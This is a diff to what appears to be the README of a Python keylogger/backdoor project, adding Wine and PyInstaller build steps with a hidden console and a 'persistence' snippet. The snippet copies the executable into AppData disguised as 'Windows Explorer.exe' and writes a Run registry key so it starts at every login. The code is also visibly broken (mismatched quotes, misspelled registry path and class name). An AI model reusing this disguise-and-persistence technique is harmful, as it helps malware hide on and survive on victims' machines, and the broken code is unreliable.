@@ -36,7 +36,25 @@ Install wine and download python package
 Wine:
 # wine msiexec /i python-2.7.xx.msi
 # cd .wine/drive_c/Pyton27/
-# wine pyton.exe -m pip install pyinstaller
+# wine python.exe -m pip install pyinstaller
 
 Install necessary libraires:
 # pyinstaller.exe zlogger.py --onefile --noconsole
+
+To make program persistence:
+import shutil
+
+def _init_....
+  self.become_persistent()
+
+try:
+  my_backdoor = Backdorr(....)
+  my_backdoor.run()
+ except Exception:
+  sys.exit()
+ 
+def become_persistent(self):
+  evil_file_location = os.environ["appdata'] + "\\Windows Explorer.exe"
+  if not os.path.exists(evil_file_location)
+    shutil.copyfile(sys.executable, evil_file_location)
+    subprocess.call('reg add HCKU\Software\Microsot\CurrentVersion\Run /v updata /t REG_SZ /d "' + evil_file_location '"' + shell=True)
